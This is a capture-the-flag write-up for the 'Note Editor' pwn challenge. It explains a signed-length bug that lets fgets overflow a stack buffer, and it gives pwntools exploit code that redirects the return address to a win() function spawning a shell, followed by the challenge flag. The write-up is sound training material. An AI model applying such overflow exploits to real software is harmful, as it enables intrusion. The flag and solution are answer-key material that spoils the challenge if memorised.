# Note Editor

## Challenge Summary

- **Category**: Pwn
- **Points**: 102
- **Solves**: 66 teams

---

### Problem Description

> The web guys always have these note apps, why not use this terminal based one instead.

---

## Challenge Structure

- A terminal-based note-taking application using a stack buffer (`char buffer[1024]`)
- Vulnerable `edit` function with signed-to-unsigned conversion bug (`int64_t length` → `fgets`) allowing stack overflow
- Exploitation leads to control over the return address and execution of the `win()` function

---

### Protections:

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

---

## Exploitation Flow

### Step 1: Identify the Vulnerability

The `edit` function reads a signed 64-bit length from the user:

```c
int64_t length;
SCANLINE("%ld", &length);
```

It then passes this length to `fgets` without checking if it is negative:

```c
fgets(note->buffer + offset, length + 2, stdin);
```

If we provide a negative `length`, it will be converted to a large unsigned value, leading to a buffer overflow that can overwrite stack data including the return address.

---

### Step 2: Craft Payload to Overwrite Return Address

We prepare a payload that fills up the buffer and overwrites the return address:

```python
payload = flat({
    0x400: elf.bss(),      # set note.buffer (RBP-0x20) to valid memory
    0x428: elf.sym.win     # overwrite return address with win()
})
```

We trigger the overflow using `edit()`:

```python
r.sendlineafter(b"Quit\n", b"4")
r.sendlineafter(b"editing: ", b"0")
r.sendlineafter(b"overwrite: ", f"{0x800 - (1 << 32)}")
r.sendline(payload)
```

---

### Step 3: Execute and Gain Shell

We exit the program to trigger the overwritten return address:

```python
r.sendlineafter(b"Quit\n", b"6")
r.interactive()
```

This calls `win()`, which runs `/bin/sh` and gives us a shell.

---

## Flag

```
GPNCTF{noW_yoU_5ur3Ly_AR3_REAdy_To_Pwn_1ADYbiRD!}
```
